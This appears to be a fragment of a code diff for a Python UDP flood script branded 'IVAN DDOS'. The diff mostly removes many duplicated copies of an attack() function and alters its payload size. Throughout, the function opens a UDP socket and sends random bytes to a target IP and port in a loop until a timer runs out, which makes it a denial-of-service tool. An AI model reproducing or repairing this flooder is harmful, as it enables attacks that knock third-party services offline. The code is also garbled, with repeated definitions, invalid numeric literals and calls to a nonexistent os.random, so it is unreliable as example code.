-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22117,7 +16853,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22149,7 +16885,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22181,7 +16917,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22213,7 +16949,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22245,7 +16981,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22271,7 +17007,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22303,39 +17039,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22367,7 +17071,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22399,415 +17103,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -22839,225 +17135,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -23433,7 +17511,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -23465,7 +17543,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -23497,7 +17575,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -23529,7 +17607,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -23561,7 +17639,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -23587,7 +17665,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -23619,39 +17697,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -23683,7 +17729,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -23715,415 +17761,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
